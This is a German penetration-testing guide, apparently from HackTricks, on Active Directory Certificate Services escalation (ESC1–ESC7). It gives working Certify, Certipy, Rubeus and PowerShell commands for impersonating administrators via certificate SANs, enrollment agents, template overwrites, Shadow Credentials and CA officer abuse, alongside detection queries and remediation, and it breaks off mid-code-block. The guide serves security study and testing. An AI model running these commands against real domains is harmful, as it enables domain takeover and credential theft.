# AD CS-Domäneneskalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Abschnitte zu Eskalationstechniken aus den Beiträgen:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Certificate Templates - ESC1

### Erklärung

### Fehlkonfigurierte Certificate Templates - ESC1 erklärt

- **Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.**
- **Eine Genehmigung durch einen Manager ist nicht erforderlich.**
- **Es sind keine Unterschriften von autorisiertem Personal erforderlich.**
- **Die Sicherheitsdeskriptoren von Certificate Templates sind zu freizügig konfiguriert, sodass Benutzer mit geringen Berechtigungen Enrollment-Rechte erhalten können.**
- **Certificate Templates sind so konfiguriert, dass sie EKUs definieren, die Authentifizierung ermöglichen:**
  - Es sind Extended Key Usage (EKU)-Bezeichner wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder keine EKU (SubCA) enthalten.
- **Das Template erlaubt Antragstellern, eine subjectAltName in die Certificate Signing Request (CSR) aufzunehmen:**
  - Active Directory (AD) priorisiert eine in einem Zertifikat enthaltene subjectAltName (SAN) zur Identitätsprüfung. Das bedeutet, dass durch Angabe der SAN in einer CSR ein Zertifikat beantragt werden kann, um sich als beliebiger Benutzer auszugeben (z. B. als Domänenadministrator). Ob Antragsteller eine SAN angeben können, wird im AD-Objekt des Certificate Templates durch die Eigenschaft `mspki-certificate-name-flag` festgelegt. Diese Eigenschaft ist eine Bitmaske. Ist das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` gesetzt, darf der Antragsteller die SAN angeben.

> [!CAUTION]
> Diese Einstellungen kennzeichnen ein mögliches ESC1-Template, nicht einen vollständig umsetzbaren Impersonation-Pfad. Prüfe, ob der Zielprincipal sich bei einer CA registrieren kann, die das Template veröffentlicht, ob CA-Enrollment erlaubt ist und ob das ausgestellte Zertifikat die Regeln für die starke SID-Zuordnung des Authentifizierungsendpunkts erfüllt. Aktuelle, gepatchte KDCs können eine angeforderte UPN ablehnen, wenn die SID des Zertifikats nicht mit dem Ziel übereinstimmt; siehe [Microsofts Anleitung zur Zertifikatszuordnung](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Enrollment-Rechte für **Domain Computers** können dazu führen, dass sich eine bereitgestellte Computeridentität registrieren darf, auch wenn der ursprüngliche Benutzer dazu nicht berechtigt ist. Prüfe die Rechte des Computerprincipals separat. Prüfe `msPKI-Minimal-Key-Size`, bevor du eine Anfrage stellst: Ein Template, das 4096-Bit-RSA-Schlüssel voraussetzt, lehnt den 2048-Bit-Standard des Clients ab. Eine in der Anfrage angegebene Ziel-SID kann eine SID-Abweichung nur dann beheben, wenn CA und KDC das resultierende Zertifikat und dessen Zuordnung akzeptieren; weder Template-Flags noch eine Enroll-ACE allein belegen dies.

Diese Funktion wird mitunter aktiviert, um die spontane Erstellung von HTTPS- oder Host-Zertifikaten durch Produkte oder Bereitstellungsdienste zu ermöglichen, oder aus Unkenntnis.

Es wird darauf hingewiesen, dass beim Erstellen eines Zertifikats mit dieser Option eine Warnung angezeigt wird. Dies ist nicht der Fall, wenn ein bestehendes Certificate Template (wie das Template `WebServer`, bei dem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und anschließend so geändert wird, dass es eine Authentifizierungs-OID enthält.<sup>[[6]](#references)</sup>

### Ausnutzung

Um **verwundbare Certificate Templates zu finden**, kannst du Folgendes ausführen:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Um **diese Schwachstelle zu missbrauchen und sich als Administrator auszugeben**, könnte man Folgendes ausführen:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Dann kannst du das generierte **Zertifikat ins `.pfx`-Format umwandeln** und es erneut zur **Authentifizierung mit Rubeus oder certipy verwenden**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Die Windows-Binärdateien „Certreq.exe“ und „Certutil.exe“ können zum Erstellen der PFX-Datei verwendet werden: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Zertifikatvorlagen im Konfigurationsschema des AD-Forests lassen sich mit der folgenden LDAP-Abfrage enumerieren. Dabei werden insbesondere Vorlagen berücksichtigt, für die weder eine Genehmigung noch Signaturen erforderlich sind, die über eine EKU für Client Authentication oder Smart Card Logon verfügen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Fehlkonfigurierte Zertifikatvorlagen – ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
2. Die Anforderung einer Managergenehmigung ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen entfällt.
4. Ein übermäßig permissiver Sicherheitsdeskriptor für die Zertifikatvorlage gewährt Benutzern mit geringen Berechtigungen Rechte zum Anfordern von Zertifikaten.
5. **Die Zertifikatvorlage ist so definiert, dass sie die Any Purpose EKU oder keine EKU enthält.**

Die **Any Purpose EKU** ermöglicht es einem Angreifer, ein Zertifikat für **jeden beliebigen Zweck** zu erhalten, darunter Clientauthentifizierung, Serverauthentifizierung, Codesignierung usw. Zur Ausnutzung dieses Szenarios kann dieselbe **bei ESC3 verwendete Technik** eingesetzt werden.

Zertifikate **ohne EKUs**, die als untergeordnete CA-Zertifikate fungieren, können für **jeden beliebigen Zweck** ausgenutzt und **auch zum Signieren neuer Zertifikate verwendet werden**. Ein Angreifer könnte daher mithilfe eines untergeordneten CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten festlegen.

Neue Zertifikate für die **Domänenauthentifizierung** funktionieren jedoch nicht, wenn die untergeordnete CA nicht vom **`NTAuthCertificates`**-Objekt als vertrauenswürdig eingestuft wird, was die Standardeinstellung ist. Dennoch kann ein Angreifer **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten für vielfältige Zwecke **missbraucht** werden (z. B. Codesignierung, Serverauthentifizierung usw.) und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk haben, etwa SAML, AD FS oder IPSec.<sup>[[6]](#references)</sup>

Um Vorlagen zu enumerieren, die diesem Szenario im Konfigurationsschema des AD Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Fehlkonfigurierte Enrollment-Agent-Vorlagen – ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, **nutzt** jedoch eine **andere EKU** (Certificate Request Agent) und **2 verschiedene Vorlagen** (es gelten also 2 Anforderungssätze).

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, ermöglicht es einem Principal, ein **Zertifikat** **für einen anderen Benutzer zu beantragen**.

Der **„Enrollment Agent“** beantragt ein Zertifikat über eine solche **Vorlage** und verwendet das resultierende **Zertifikat, um einen CSR im Namen des anderen Benutzers mitzuzeichnen**. Anschließend **sendet** er den **mitgezeichneten CSR** an die CA und beantragt ein Zertifikat über eine **Vorlage**, die **„enroll on behalf of“** erlaubt. Die CA antwortet daraufhin mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.<sup>[[6]](#references)</sup>

**Anforderungen 1:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Anforderung einer Genehmigung durch einen Manager ist nicht aktiviert.
- Es sind keine autorisierten Signaturen erforderlich.
- Der Sicherheitsdeskriptor der Zertifikatvorlage ist übermäßig permissiv und gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Zertifikatvorlage enthält die Certificate Request Agent EKU und ermöglicht damit, Zertifikate über andere Vorlagen im Namen anderer Principals zu beantragen.

**Anforderungen 2:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Genehmigung durch einen Manager wird umgangen.
- Eine Zielvorlage der Version 1 kann einen Enrollment Agent akzeptieren, ohne über neuere, granulare Steuerungsmöglichkeiten für Ausstellungsrichtlinien zu verfügen. Bei Version 2 oder höher solltest du die Anforderungen an Ausstellungsrichtlinien und autorisierte Signaturen prüfen, anstatt die Vorlage allein aufgrund ihrer Version auszuschließen.
- Eine in der Zertifikatvorlage definierte EKU ermöglicht die Domain-Authentifizierung.
- Einschränkungen für Enrollment Agents sind auf der CA nicht aktiviert.

Die Zielvorlage muss außerdem von der ausgewählten CA veröffentlicht sein, dem Zielkonto Enrollment erlauben und die vorgesehene Domain-Authentifizierung unterstützen. Prüfe die erforderlichen Subject-/SAN-Attribute für dieses Konto. Beispielsweise kann eine Vorlage, die den Subject-Wert für die E-Mail-Adresse aus AD bezieht, kein Zertifikat für ein Konto ausstellen, dem der erforderliche `mail`-Wert fehlt. Ein Agent-Zertifikat allein erfüllt diese Anforderungen der Zielvorlage nicht.

### Ausnutzung

Du kannst [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Die **Benutzer**, die ein **Enrollment-Agent-Zertifikat erhalten** dürfen, die Vorlagen, für die **Enrollment Agents** Enrollment-Anfragen stellen dürfen, und die **Konten**, in deren Namen der Enrollment Agent handeln darf, können durch Enterprise-CAs eingeschränkt werden. Dazu öffnet man das `certsrc.msc`-**Snap-in**, **klickt mit der rechten Maustaste auf die CA**, klickt auf **Eigenschaften** und wechselt dann zur Registerkarte „Enrollment Agents“.

Es ist jedoch anzumerken, dass die **Standardeinstellung** für CAs „**Do not restrict enrollment agents**“ lautet. Wenn Administratoren die Einschränkung für Enrollment Agents aktivieren und „Restrict enrollment agents“ festlegen, bleibt die Standardkonfiguration äußerst permissiv. Sie erlaubt **Everyone**, Enrollment-Anfragen für alle Vorlagen im Namen beliebiger Personen zu stellen.

### Windows-exklusive PowerShell-PoCs mit Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) führt ESC1 und ESC2/ESC3 ohne Certify oder Certipy aus. Die Skripte erstellen mit der `X509Enrollment`-COM-API einen exportierbaren 2048-Bit-RSA-Schlüssel, erzeugen eine PKCS#10-Anfrage, ermitteln über LDAP den ersten `pKIEnrollmentService`, übermitteln die Anfrage mit `CertificateAuthority.Request`, installieren die Antwort in `Cert:\CurrentUser\My` und exportieren eine Base64-kodierte PFX-Datei. Das ESC1-Skript fügt einen vom Angreifer ausgewählten UPN-SAN hinzu (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, Wert `0xb`), während die ESC2/ESC3-Skripte das erste Zertifikat verwenden, um eine PKCS#7-On-Behalf-Of-Anfrage zu signieren.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Die Skripte geben das Base64 des **PFX** aus, das den privaten Schlüssel enthält, zur direkten Verwendung mit Rubeus. Ersetzen Sie es nicht durch `[Convert]::ToBase64String($cert.RawData)`: `RawData` kodiert nur das öffentliche Zertifikat und kann die PKINIT-Anfrage nicht signieren.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Zugriffskontrolle für anfällige Zertifikatvorlagen – ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** für **Zertifikatvorlagen** legt fest, über welche **Berechtigungen** bestimmte **AD-Prinzipale** in Bezug auf die Vorlage verfügen.

Verfügt ein **Angreifer** über die erforderlichen **Berechtigungen**, um eine **Vorlage** zu **ändern** und eine der in **vorherigen Abschnitten** beschriebenen **ausnutzbaren Fehlkonfigurationen** einzurichten, kann dies eine Rechteausweitung ermöglichen.

Zu den relevanten Berechtigungen für Zertifikatvorlagen gehören:<sup>[[6]](#references)</sup>

- **Owner:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
- **FullControl:** Ermöglicht die vollständige Kontrolle über das Objekt, einschließlich der Möglichkeit, beliebige Attribute zu ändern.
- **WriteOwner:** Ermöglicht, den Besitzer des Objekts in einen vom Angreifer kontrollierten Prinzipal zu ändern.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen und kann einem Angreifer dadurch FullControl gewähren.
- **WriteProperty:** Berechtigt zum Bearbeiten beliebiger Objekteigenschaften.

Prüfe außerdem die DACL des Containers `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Ein passender `CreateChild`-ACE, der auf die [`pKICertificateTemplate`-Klasse](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) beschränkt ist, oder umfassende Vollzugriffsrechte kommen infrage, um ein neues Vorlagenobjekt zu erstellen. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44), dass dieser Container solche Vorlagenobjekte enthält. Prüfe passende verweigernde ACEs und die Vererbung, bevor du entscheidest, ob die Erstellung möglich ist. Eine erstellte Vorlage stellt für sich genommen kein Zertifikat aus: Eine CA muss sie veröffentlichen, der anfordernde Prinzipal benötigt Einschreibeberechtigung und das Zertifikat muss am Authentifizierungsendpunkt der gewünschten Identität zugeordnet werden.

### Missbrauch

Um Prinzipale mit Bearbeitungsrechten für Vorlagen und andere PKI-Objekte zu ermitteln, führe eine Enumeration mit Certify durch:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Ein Beispiel für eine privesc wie die vorherige:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 liegt vor, wenn ein Benutzer Schreibberechtigungen für eine Zertifikatvorlage hat. Dies kann beispielsweise ausgenutzt werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und sie dadurch für ESC1 anfällig zu machen.

Eine Vorlage, die es dem Antragsteller bereits erlaubt, den Betreff anzugeben, aber nur die Verwendung für Server Authentication unterstützt, ist für sich genommen keine Vorlage für die Benutzeranmeldung. Mit effektiven Rechten zur Steuerung der Vorlage könnte ein Angreifer deren Authentication-EKUs oder Anwendungsrichtlinien ändern, bevor er ein Zertifikat anfordert; [Microsoft dokumentiert den Anmeldezweck der Smartcard-Logon-EKU](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Prüfe, ob eine CA die geänderte Vorlage veröffentlicht, der Anfragende ein Zertifikat beantragen kann, Genehmigungs- und Signaturanforderungen erfüllt sind und das ausgestellte Zertifikat dem vorgesehenen Konto zugeordnet wird. Insbesondere lehnen [gepatchte Domänencontroller im Full Enforcement-Modus](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) Zertifikate ohne starke Zuordnung ab; das Hinzufügen einer Ziel-UPN zu einer Anfrage umgeht diese Anforderung nicht.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` hat die neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert. Er ist als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt.<sup>[[8]](#references)</sup> Hier ein kleiner Vorgeschmack auf Certipys Befehl `shadow auto`, mit dem sich der NT-Hash des Opfers abrufen lässt.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. **Standardmäßig** überschreibt Certipy die Konfiguration so, dass sie **für ESC1 anfällig** ist. Wir können auch den **Parameter `-save-old` angeben, um die alte Konfiguration zu speichern**. Das ist nützlich, um die Konfiguration nach unserem Angriff **wiederherzustellen**.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Zugriffskontrolle für verwundbare PKI-Objekte – ESC5

### Erklärung

Das weitreichende Netz miteinander verknüpfter ACL-basierter Beziehungen, zu dem neben Zertifikatvorlagen und der Zertifizierungsstelle auch weitere Objekte gehören, kann die Sicherheit des gesamten AD-CS-Systems beeinträchtigen. Zu diesen sicherheitsrelevanten Objekten zählen:

- Das AD-Computerobjekt des CA-Servers, das über Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes untergeordnete AD-Objekt und jeder untergeordnete Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dazu gehören unter anderem Container und Objekte wie der Certificate Templates-Container, der Certification Authorities-Container, das NTAuthCertificates-Objekt und der Enrollment Services-Container.

Die Sicherheit des PKI-Systems kann gefährdet werden, wenn es einem Angreifer mit geringen Berechtigungen gelingt, eines dieser kritischen Elemente zu kontrollieren.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 – ESC6

### Erklärung

Der im [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Sachverhalt geht auch auf die Auswirkungen des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ein, wie von Microsoft beschrieben. Ist diese Konfiguration auf einer Zertifizierungsstelle (CA) aktiviert, können **benutzerdefinierte Werte** in den **Subject Alternative Name** für **beliebige Anfragen** aufgenommen werden, einschließlich solcher, die aus Active Directory® erstellt wurden. Dadurch kann sich ein **Angreifer** über **jede Vorlage** registrieren, die für die Domänen**authentifizierung** konfiguriert ist – insbesondere über Vorlagen, die eine Registrierung durch **Benutzer ohne besondere Berechtigungen** zulassen, wie die standardmäßige User-Vorlage. So kann ein Zertifikat erlangt werden, mit dem sich der Angreifer als Domänenadministrator oder **jede andere aktive Identität** innerhalb der Domäne authentifizieren kann.<sup>[[9]](#references)</sup>

**Hinweis**: Das Hinzufügen von **alternativen Namen** zu einer Certificate Signing Request (CSR) über das Argument `-attrib "SAN:"` in `certreq.exe` (auch als „Name Value Pairs“ bezeichnet) unterscheidet sich von der Ausnutzungsmethode für SANs bei ESC1. Der Unterschied besteht darin, **wie die Kontoinformationen eingebettet werden** – in einem Zertifikatsattribut statt in einer Erweiterung.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Unternehmen den folgenden Befehl mit `certutil.exe` ausführen:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Dieser Vorgang nutzt im Wesentlichen **Remote Registry Access**, daher könnte ein alternativer Ansatz sein:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Um diese Einstellungen zu ändern, kann man den folgenden Befehl von jeder Workstation ausführen, sofern man über **Domänenadministratorrechte** oder gleichwertige Rechte verfügt:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das Flag mit folgendem Befehl entfernt werden:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Nach der Installation der Sicherheitsupdates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die Eigenschaft `objectSid` des **Anforderers** einbezieht. Bei ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** entspricht die SID jedoch der **`objectSid` des Anforderers** und nicht dem SAN.\
> Für einen Angriff mit ESC6 muss das System anfällig für ESC10 (Weak Certificate Mappings) sein, bei dem das **SAN gegenüber der neuen Sicherheitserweiterung bevorzugt wird**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Die Zugriffssteuerung für eine Zertifizierungsstelle erfolgt über eine Reihe von Berechtigungen, die die Aktionen der CA regeln. Diese Berechtigungen lassen sich anzeigen, indem du `certsrv.msc` öffnest, mit der rechten Maustaste auf eine CA klickst, „Eigenschaften“ auswählst und anschließend zum Tab „Sicherheit“ navigierst. Außerdem können Berechtigungen mit dem PSPKI-Modul und Befehlen wie den folgenden aufgezählt werden:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Dies bietet Einblicke in die wichtigsten Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen „CA administrator“ bzw. „Certificate Manager“ entsprechen.<sup>[[6]](#references)</sup>

#### Missbrauch

Mit **`ManageCA`**-Rechten für eine Zertifizierungsstelle kann der Principal Einstellungen remote mithilfe von PSPKI manipulieren. Dazu gehört das Aktivieren des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe von SANs in beliebigen Templates zu ermöglichen – ein entscheidender Aspekt bei der domain escalation.

Dieser Prozess lässt sich mit dem PSPKI-Cmdlet **Enable-PolicyModuleFlag** vereinfachen, sodass Änderungen ohne direkte Interaktion mit der GUI vorgenommen werden können.

Mit **`ManageCertificates`**-Rechten können ausstehende Anträge genehmigt und damit die Schutzmaßnahme „CA certificate manager approval“ umgangen werden.

Mit den Modulen **Certify** und **PSPKI** lässt sich ein Zertifikat beantragen, genehmigen und herunterladen:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Angriff 2

#### Erklärung

> [!WARNING]
> Im **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um das Flag **EDITF_ATTRIBUTESUBJECTALTNAME2** zu **aktivieren** und den **ESC6-Angriff** durchzuführen. Dies hat jedoch erst dann eine Wirkung, wenn der CA-Dienst (`CertSvc`) neu gestartet wird. Hat ein Benutzer das Zugriffsrecht `Manage CA`, darf er den **Dienst auch neu starten**. Das bedeutet jedoch **nicht, dass der Benutzer den Dienst remote neu starten kann**. Außerdem funktioniert E**SC6 aufgrund der Sicherheitsupdates vom Mai 2022 in den meisten gepatchten Umgebungen möglicherweise nicht direkt.

Daher wird hier ein anderer Angriff vorgestellt.

Voraussetzungen:

- Nur die Berechtigung **`ManageCA`**
- Die Berechtigung **`Manage Certificates`** (kann über **`ManageCA`** erteilt werden)
- Die Zertifikatvorlage **`SubCA`** muss **aktiviert** sein (kann über **`ManageCA`** aktiviert werden)

Die Technik beruht darauf, dass Benutzer mit den Zugriffsrechten `Manage CA` _und_ `Manage Certificates` **fehlgeschlagene Zertifikatanforderungen ausstellen** können. Die Zertifikatvorlage **`SubCA`** ist **anfällig für ESC1**, aber **nur Administratoren** können sich für die Vorlage registrieren. Daher kann ein **Benutzer** die Registrierung für **`SubCA`** **anfordern** – was **abgelehnt** wird –, woraufhin der Manager das Zertifikat ausstellt.<sup>[[6]](#references)</sup>

#### Missbrauch

Du kannst dir selbst das Zugriffsrecht **`Manage Certificates`** erteilen, indem du deinen Benutzer als neuen Beauftragten hinzufügst.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Die **`SubCA`**-Vorlage kann auf der CA mit dem Parameter `-enable-template` **aktiviert** werden. Standardmäßig ist die `SubCA`-Vorlage aktiviert.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir beginnen, **ein Zertifikat auf Grundlage der Vorlage `SubCA` anzufordern**.

**Diese Anfrage wird abgelehn**t, aber wir speichern den privaten Schlüssel und notieren die Anforderungs-ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Mit unseren **`Manage CA` und `Manage Certificates`** können wir anschließend die fehlgeschlagene Zertifikatsanforderung mit dem Befehl `ca` und dem Parameter `-issue-request <request ID>` ausstellen.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Und schließlich können wir das **ausgestellte Zertifikat abrufen**, indem wir den Befehl `req` mit dem Parameter `-retrieve <request ID>` verwenden.

```bash
